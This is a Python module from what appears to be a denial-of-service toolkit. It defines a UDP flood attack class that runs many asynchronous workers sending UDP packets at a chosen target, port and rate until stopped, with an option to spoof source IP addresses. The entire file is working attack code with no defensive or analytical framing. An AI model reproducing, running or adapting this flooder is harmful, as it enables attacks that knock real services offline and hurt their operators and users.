import asyncio
import random
from typing import Any

import structlog

from attack.base import BaseAttacker
from utils.packet import PacketCrafter

logger = structlog.get_logger(__name__)


class UDPFloodAttack(BaseAttacker):
    name = "udp_flood"
    description = "UDP flood attack with configurable payload size and optional IP spoofing"

    async def run(
        self,
        target: str,
        port: int = 53,
        rate: int = 1000,
        packet_size: int = 512,
        threads: int = 10,
        spoof: bool = False,
        **kwargs: Any,
    ) -> None:
        if not PacketCrafter.PACKET_AVAILABLE:
            logger.error("scapy_required", message="UDP flood requires scapy. Install with: pip install scapy")
            self.session.fail("scapy not available")
            return

        per_thread_rate = max(1, rate // threads)
        interval = 1.0 / per_thread_rate if per_thread_rate > 0 else 0.001

        async def worker() -> None:
            while not self.session.is_stopped:
                await self.session._pause_event.wait()
                sent = PacketCrafter.send_udp_flood(target, port, count=1, payload_size=packet_size, spoof=spoof)
                if sent:
                    self.session.stats.packets_sent += 1
                    self.session.stats.bytes_sent += packet_size
                else:
                    self.session.stats.errors += 1
                await asyncio.sleep(interval)

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        try:
            await self.session.wait_for_stop()
        finally:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
